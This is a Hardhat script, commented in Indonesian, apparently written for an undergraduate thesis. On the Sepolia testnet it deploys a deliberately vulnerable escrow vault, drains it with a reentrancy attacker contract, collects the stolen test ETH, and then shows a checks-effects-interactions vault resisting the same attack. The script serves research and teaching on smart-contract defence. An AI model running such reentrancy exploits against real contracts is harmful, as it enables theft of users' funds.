/**
 * sepolia_skripsi_scenario.js
 * Menjalankan PERSIS skenario Bab 3.6 skripsi di Sepolia Testnet:
 *   Pembeli A  : 1.5 ETH (simulasi 1 ton komoditas)
 *   Pembeli B  : 0.8 ETH (pembayaran parsial)
 *   Penyerang  : 0.1 ETH (deposit minimal sebagai penjual)
 *   Total Vault: 2.4 ETH
 */

const { ethers } = require("hardhat");

// ── JUMLAH ETH PERSIS SESUAI BAB 3.6 SKRIPSI ──────────────────────────
const BUYER_A_DEPOSIT = ethers.parseEther("1.5");   // Pembeli A: 1 ton komoditas
const BUYER_B_DEPOSIT = ethers.parseEther("0.8");   // Pembeli B: pembayaran parsial
const ATTACKER_ENTRY  = ethers.parseEther("0.1");   // Penyerang: deposit minimum
const TOTAL_HONEYPOT  = BUYER_A_DEPOSIT + BUYER_B_DEPOSIT; // 2.3 ETH (dana korban)
const TOTAL_VAULT     = TOTAL_HONEYPOT + ATTACKER_ENTRY;   // 2.4 ETH

// ── HELPER: kirim tx, log gas detail ──────────────────────────────────
async function waitTx(txPromise, label) {
  const tx = await txPromise;
  const r  = await tx.wait();
  const gasCostEth = ethers.formatEther(r.gasUsed * r.gasPrice);
  console.log(`    ▸ ${label}`);
  console.log(`      Gas: ${r.gasUsed.toLocaleString()} | Price: ${ethers.formatUnits(r.gasPrice, "gwei")} gwei | Biaya: ${gasCostEth} ETH | Hash: ${r.hash.slice(0,22)}...`);
  return r;
}

async function main() {
  const [wallet] = await ethers.getSigners();
  // fakeSeller: alamat acak — mewakili penjual jujur yang menerima pembayaran korban
  const fakeSeller = ethers.Wallet.createRandom().address;

  const walletBalStart = await ethers.provider.getBalance(wallet.address);

  console.log("═══════════════════════════════════════════════════════════════");
  console.log("   VALIDASI SEPOLIA — SKENARIO SKRIPSI BAB 3.6 (EXACT AMOUNTS)");
  console.log("═══════════════════════════════════════════════════════════════");
  console.log(`Wallet  : ${wallet.address}`);
  console.log(`Balance : ${ethers.formatEther(walletBalStart)} ETH`);
  console.log(`FakeSeller (korban): ${fakeSeller}`);
  console.log(`\nKonfigurasi Honeypot (Bab 3.6.1 Skripsi):`);
  console.log(`  Pembeli A  : ${ethers.formatEther(BUYER_A_DEPOSIT)} ETH — simulasi 1 ton komoditas`);
  console.log(`  Pembeli B  : ${ethers.formatEther(BUYER_B_DEPOSIT)} ETH — pembayaran parsial`);
  console.log(`  Penyerang  : ${ethers.formatEther(ATTACKER_ENTRY)} ETH — deposit minimal sebagai penjual`);
  console.log(`  Total Vault: ${ethers.formatEther(TOTAL_VAULT)} ETH`);
  console.log(`  Dana Korban Berisiko: ${ethers.formatEther(TOTAL_HONEYPOT)} ETH\n`);

  // ═══════════════════════════════════════════════════════════════
  // FASE 1: DEPLOY KONTRAK SEGAR
  // ═══════════════════════════════════════════════════════════════
  console.log("═══ FASE 1: DEPLOY KONTRAK ═══════════════════════════════════");

  const InsecureVault = await ethers.getContractFactory("InsecureVault");
  const insecureVault = await InsecureVault.deploy();
  await insecureVault.waitForDeployment();
  const insecureAddr = await insecureVault.getAddress();
  let r = await insecureVault.deploymentTransaction().wait();
  const deployInsecureGas = r.gasUsed;
  const deployInsecurePrice = r.gasPrice;
  console.log(`  InsecureVault : ${insecureAddr}`);
  console.log(`    Gas: ${r.gasUsed.toLocaleString()} | Price: ${ethers.formatUnits(r.gasPrice, "gwei")} gwei | Biaya: ${ethers.formatEther(r.gasUsed * r.gasPrice)} ETH`);

  const SecureVault = await ethers.getContractFactory("SecureVault");
  const secureVault = await SecureVault.deploy();
  await secureVault.waitForDeployment();
  const secureAddr = await secureVault.getAddress();
  r = await secureVault.deploymentTransaction().wait();
  const deploySecureGas = r.gasUsed;
  const deploySecurePrice = r.gasPrice;
  console.log(`  SecureVault   : ${secureAddr}`);
  console.log(`    Gas: ${r.gasUsed.toLocaleString()} | Price: ${ethers.formatUnits(r.gasPrice, "gwei")} gwei | Biaya: ${ethers.formatEther(r.gasUsed * r.gasPrice)} ETH`);

  const Attacker = await ethers.getContractFactory("Attacker");

  // Attacker 1: menarget InsecureVault
  const attacker = await Attacker.deploy(insecureAddr);
  await attacker.waitForDeployment();
  const attackerAddr = await attacker.getAddress();
  r = await attacker.deploymentTransaction().wait();
  const deployAttackerGas = r.gasUsed;
  const deployAttackerPrice = r.gasPrice;
  console.log(`  Attacker→InsecureVault: ${attackerAddr}`);
  console.log(`    Gas: ${r.gasUsed.toLocaleString()} | Price: ${ethers.formatUnits(r.gasPrice, "gwei")} gwei | Biaya: ${ethers.formatEther(r.gasUsed * r.gasPrice)} ETH`);

  // Attacker 2: menarget SecureVault
  const attacker2 = await Attacker.deploy(secureAddr);
  await attacker2.waitForDeployment();
  const attacker2Addr = await attacker2.getAddress();
  r = await attacker2.deploymentTransaction().wait();
  const deployAttacker2Gas = r.gasUsed;
  console.log(`  Attacker→SecureVault  : ${attacker2Addr}`);
  console.log(`    Gas: ${r.gasUsed.toLocaleString()} | Price: ${ethers.formatUnits(r.gasPrice, "gwei")} gwei | Biaya: ${ethers.formatEther(r.gasUsed * r.gasPrice)} ETH\n`);

  // ═══════════════════════════════════════════════════════════════
  // FASE 2: SETUP HONEYPOT InsecureVault
  // ═══════════════════════════════════════════════════════════════
  console.log("═══ FASE 2: SETUP HONEYPOT InsecureVault (Bab 3.6.1) ════════");

  console.log(`\n  [Order 0] Pembeli A → ${ethers.formatEther(BUYER_A_DEPOSIT)} ETH (1 ton komoditas):`);
  const rO0create   = await waitTx(insecureVault.createOrder(fakeSeller), "createOrder(fakeSeller)");
  const rO0deposit  = await waitTx(insecureVault.depositFunds(0, { value: BUYER_A_DEPOSIT }), `depositFunds ${ethers.formatEther(BUYER_A_DEPOSIT)} ETH`);
  const rO0confirm  = await waitTx(insecureVault.confirmDelivery(0), "confirmDelivery");

  console.log(`\n  [Order 1] Pembeli B → ${ethers.formatEther(BUYER_B_DEPOSIT)} ETH (pembayaran parsial):`);
  const rO1create   = await waitTx(insecureVault.createOrder(fakeSeller), "createOrder(fakeSeller)");
  const rO1deposit  = await waitTx(insecureVault.depositFunds(1, { value: BUYER_B_DEPOSIT }), `depositFunds ${ethers.formatEther(BUYER_B_DEPOSIT)} ETH`);
  const rO1confirm  = await waitTx(insecureVault.confirmDelivery(1), "confirmDelivery");

  console.log(`\n  [Order 2] Entry Penyerang → ${ethers.formatEther(ATTACKER_ENTRY)} ETH (deposit minimum):`);
  const rO2create   = await waitTx(insecureVault.createOrder(attackerAddr), "createOrder(attackerContract sebagai penjual)");
  const rO2deposit  = await waitTx(insecureVault.depositFunds(2, { value: ATTACKER_ENTRY }), `depositFunds ${ethers.formatEther(ATTACKER_ENTRY)} ETH`);
  const rO2confirm  = await waitTx(insecureVault.confirmDelivery(2), "confirmDelivery");

  const ivVaultBefore = await insecureVault.getContractBalance();
  const attackerBalVault = await insecureVault.getBalance(attackerAddr);
  console.log(`\n  ── State Vault Sebelum Serangan ──`);
  console.log(`     Total vault     : ${ethers.formatEther(ivVaultBefore)} ETH ✓`);
  console.log(`     Saldo penyerang : ${ethers.formatEther(attackerBalVault)} ETH`);
  console.log(`     Dana korban     : ${ethers.formatEther(TOTAL_HONEYPOT)} ETH`);

  // ═══════════════════════════════════════════════════════════════
  // FASE 3: SERANGAN REENTRANCY
  // ═══════════════════════════════════════════════════════════════
  console.log("\n═══ FASE 3: SERANGAN REENTRANCY (Bab 3.6.1) ════════════════");

  // gasLimit 700000 cukup untuk 24 loop (24 × ~15000 + overhead)
  const attackTx = await attacker.attack({ gasLimit: 700000 });
  const rAttack  = await attackTx.wait();

  const reentryCount   = await attacker.getReentrancyCount();
  const ivVaultAfter   = await insecureVault.getContractBalance();
  const attackerEthBal = await ethers.provider.getBalance(attackerAddr);
  const drained        = ivVaultBefore - ivVaultAfter;

  console.log(`\n  Hasil Serangan Reentrancy:`);
  console.log(`    Gas serangan         : ${rAttack.gasUsed.toLocaleString()} gas`);
  console.log(`    Effective Gas Price  : ${ethers.formatUnits(rAttack.gasPrice, "gwei")} gwei`);
  console.log(`    Biaya TX serangan    : ${ethers.formatEther(rAttack.gasUsed * rAttack.gasPrice)} ETH`);
  console.log(`    Loop reentrancy      : ${reentryCount}×`);
  console.log(`    Vault sebelum        : ${ethers.formatEther(ivVaultBefore)} ETH`);
  console.log(`    Vault sesudah        : ${ethers.formatEther(ivVaultAfter)} ETH`);
  console.log(`    Dana dicuri          : ${ethers.formatEther(drained)} ETH`);
  console.log(`    Di attacker contract : ${ethers.formatEther(attackerEthBal)} ETH`);

  if (ivVaultAfter === 0n) {
    console.log(`    STATUS: 🔴 SERANGAN BERHASIL — Vault terkuras 100%`);
    console.log(`            Keuntungan ilegal: ${ethers.formatEther(drained - ATTACKER_ENTRY)} ETH`);
  }

  // Exfiltrate ke wallet
  console.log(`\n  Exfiltrate dana ke wallet penyerang:`);
  const rCollect = await waitTx(attacker.collectFunds(), "collectFunds()");
  const walletAfterAttack = await ethers.provider.getBalance(wallet.address);
  console.log(`    Saldo wallet setelah exfiltrate: ${ethers.formatEther(walletAfterAttack)} ETH`);

  // ═══════════════════════════════════════════════════════════════
  // FASE 4: UJI PENCEGAHAN CEI — SecureVault
  // ═══════════════════════════════════════════════════════════════
  console.log("\n═══ FASE 4: UJI CEI SecureVault — JUMLAH SAMA PERSIS (Bab 3.6.2) ═══");
  console.log("  (Menggunakan jumlah ETH identik: 1.5 + 0.8 + 0.1 ETH = 2.4 ETH)");

  console.log(`\n  [Order 0] Pembeli A → ${ethers.formatEther(BUYER_A_DEPOSIT)} ETH ke SecureVault:`);
  await waitTx(secureVault.createOrder(fakeSeller), "createOrder(fakeSeller)");
  await waitTx(secureVault.depositFunds(0, { value: BUYER_A_DEPOSIT }), `depositFunds ${ethers.formatEther(BUYER_A_DEPOSIT)} ETH`);
  await waitTx(secureVault.confirmDelivery(0), "confirmDelivery");

  console.log(`\n  [Order 1] Pembeli B → ${ethers.formatEther(BUYER_B_DEPOSIT)} ETH ke SecureVault:`);
  await waitTx(secureVault.createOrder(fakeSeller), "createOrder(fakeSeller)");
  await waitTx(secureVault.depositFunds(1, { value: BUYER_B_DEPOSIT }), `depositFunds ${ethers.formatEther(BUYER_B_DEPOSIT)} ETH`);
  await waitTx(secureVault.confirmDelivery(1), "confirmDelivery");

  console.log(`\n  [Order 2] Entry Penyerang → ${ethers.formatEther(ATTACKER_ENTRY)} ETH ke SecureVault:`);
  await waitTx(secureVault.createOrder(attacker2Addr), "createOrder(attackerContract sebagai penjual)");
  await waitTx(secureVault.depositFunds(2, { value: ATTACKER_ENTRY }), `depositFunds ${ethers.formatEther(ATTACKER_ENTRY)} ETH`);
  await waitTx(secureVault.confirmDelivery(2), "confirmDelivery");

  const svVaultBefore = await secureVault.getContractBalance();
  console.log(`\n  ── State SecureVault Sebelum Serangan ──`);
  console.log(`     Total vault     : ${ethers.formatEther(svVaultBefore)} ETH ✓`);

  // Eksekusi serangan
  console.log(`\n  Eksekusi serangan reentrancy pada SecureVault:`);
  let ceiGasUsed  = 0n;
  let ceiGasPrice = 0n;
  let ceiStatus   = "";

  try {
    const txCei = await attacker2.attack({ gasLimit: 700000 });
    const rCei  = await txCei.wait();
    ceiGasUsed  = rCei.gasUsed;
    ceiGasPrice = rCei.gasPrice;
    ceiStatus   = "⚠️ UNEXPECTED SUCCESS";
    console.log(`    Gas: ${rCei.gasUsed.toLocaleString()} | STATUS: ${ceiStatus}`);
  } catch (err) {
    ceiStatus = "🟢 REVERT — CEI Pattern berhasil memblokir serangan";
    console.log(`    STATUS: ${ceiStatus}`);
    // Gas untuk reverted TX masih terbakar — estimasi dari gas price saat ini
    const feeData = await ethers.provider.getFeeData();
    ceiGasPrice = feeData.gasPrice || 0n;
  }

  const svVaultAfter = await secureVault.getContractBalance();
  const svUnchanged  = svVaultAfter === svVaultBefore;

  console.log(`\n  ── Hasil Setelah Percobaan Serangan ──`);
  console.log(`     Vault sebelum   : ${ethers.formatEther(svVaultBefore)} ETH`);
  console.log(`     Vault sesudah   : ${ethers.formatEther(svVaultAfter)} ETH`);
  console.log(`     Perubahan       : ${ethers.formatEther(svVaultAfter - svVaultBefore)} ETH`);
  console.log(`     Dana korban     : ${svUnchanged ? "✅ 100% AMAN — tidak ada ETH yang dicuri!" : "❌ ADA KERUGIAN!"}`);

  // ═══════════════════════════════════════════════════════════════
  // RINGKASAN AKHIR
  // ═══════════════════════════════════════════════════════════════
  const walletFinal = await ethers.provider.getBalance(wallet.address);

  console.log("\n");
  console.log("═══════════════════════════════════════════════════════════════");
  console.log("   RINGKASAN HASIL — SKENARIO BAB 3.6 SKRIPSI (SEPOLIA)");
  console.log("═══════════════════════════════════════════════════════════════");
  console.log(`  Jumlah ETH Sesuai Skripsi:`);
  console.log(`    Pembeli A = ${ethers.formatEther(BUYER_A_DEPOSIT)} ETH | Pembeli B = ${ethers.formatEther(BUYER_B_DEPOSIT)} ETH | Penyerang = ${ethers.formatEther(ATTACKER_ENTRY)} ETH`);
  console.log(`    Total Vault = ${ethers.formatEther(TOTAL_VAULT)} ETH | Dana Korban = ${ethers.formatEther(TOTAL_HONEYPOT)} ETH`);
  console.log("───────────────────────────────────────────────────────────────");
  console.log("  CONTRACT ADDRESSES:");
  console.log(`    InsecureVault            : ${insecureAddr}`);
  console.log(`    SecureVault              : ${secureAddr}`);
  console.log(`    Attacker (→InsecureVault): ${attackerAddr}`);
  console.log(`    Attacker (→SecureVault)  : ${attacker2Addr}`);
  console.log("───────────────────────────────────────────────────────────────");
  console.log("  GAS DEPLOYMENT (on-chain Sepolia):");
  console.log(`    InsecureVault : ${deployInsecureGas.toLocaleString()} gas | ${ethers.formatUnits(deployInsecurePrice, "gwei")} gwei | ${ethers.formatEther(deployInsecureGas * deployInsecurePrice)} ETH`);
  console.log(`    SecureVault   : ${deploySecureGas.toLocaleString()} gas | ${ethers.formatUnits(deploySecurePrice, "gwei")} gwei | ${ethers.formatEther(deploySecureGas * deploySecurePrice)} ETH`);
  console.log(`    Attacker      : ${deployAttackerGas.toLocaleString()} gas | (×2 instance)`);
  console.log("───────────────────────────────────────────────────────────────");
  console.log("  SKENARIO 3.6.1 — SERANGAN REENTRANCY (InsecureVault):");
  console.log(`    Gas serangan         : ${rAttack.gasUsed.toLocaleString()} gas`);
  console.log(`    Effective gas price  : ${ethers.formatUnits(rAttack.gasPrice, "gwei")} gwei`);
  console.log(`    Biaya TX serangan    : ${ethers.formatEther(rAttack.gasUsed * rAttack.gasPrice)} ETH`);
  console.log(`    Loop reentrancy      : ${reentryCount}×`);
  console.log(`    Dana dicuri          : ${ethers.formatEther(drained)} ETH (${ivVaultAfter === 0n ? "100%" : "parsial"})`);
  console.log(`    Keuntungan ilegal    : ${ethers.formatEther(drained - ATTACKER_ENTRY)} ETH`);
  console.log(`    STATUS               : 🔴 EKSPLOITASI BERHASIL`);
  console.log("───────────────────────────────────────────────────────────────");
  console.log("  SKENARIO 3.6.2 — PENCEGAHAN CEI (SecureVault):");
  console.log(`    Vault sebelum serangan : ${ethers.formatEther(svVaultBefore)} ETH`);
  console.log(`    Vault sesudah serangan : ${ethers.formatEther(svVaultAfter)} ETH`);
  console.log(`    STATUS                 : ${ceiStatus}`);
  console.log(`    Dana korban terlindungi: ${ethers.formatEther(svVaultBefore)} ETH (${svUnchanged ? "100% aman" : "ADA KERUGIAN"})`);
  console.log("───────────────────────────────────────────────────────────────");
  console.log(`  Sisa Saldo Wallet : ${ethers.formatEther(walletFinal)} ETH`);
  console.log("═══════════════════════════════════════════════════════════════");
  console.log("\n  Verifikasi on-chain (Sepolia Etherscan):");
  console.log(`    https://sepolia.etherscan.io/address/${insecureAddr}`);
  console.log(`    https://sepolia.etherscan.io/address/${secureAddr}`);
}

main().catch(console.error);
